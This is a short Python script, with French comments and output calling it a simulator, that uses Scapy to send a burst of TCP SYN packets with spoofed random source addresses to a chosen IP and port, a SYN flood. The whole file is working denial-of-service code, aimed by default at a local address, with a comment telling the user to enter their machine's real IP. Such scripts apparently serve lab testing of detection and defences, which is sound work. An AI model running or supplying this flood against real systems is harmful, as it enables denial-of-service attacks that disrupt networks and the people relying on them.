from scapy.all import IP, TCP, send
import random
import time


def simulate_syn_flood(target_ip, target_port=80, packet_count=100):
    print("[SIMULATEUR] Démarrage SYN Flood")
    print(f"[SIMULATEUR] Cible : {target_ip}")

    for _ in range(packet_count):
        pkt = IP(
            src=f"192.168.1.{random.randint(10, 250)}",
            dst=target_ip
        ) / TCP(
            sport=random.randint(1024, 65535),
            dport=target_port,
            flags="S"
        )

        send(pkt, verbose=False)
        time.sleep(0.01)

    print("[SIMULATEUR] SYN Flood terminé")


if __name__ == "__main__":
    # ⚠️ METS L’IP RÉELLE DE TA MACHINE
    TARGET_IP = "192.168.1.1"

    simulate_syn_flood(TARGET_IP)
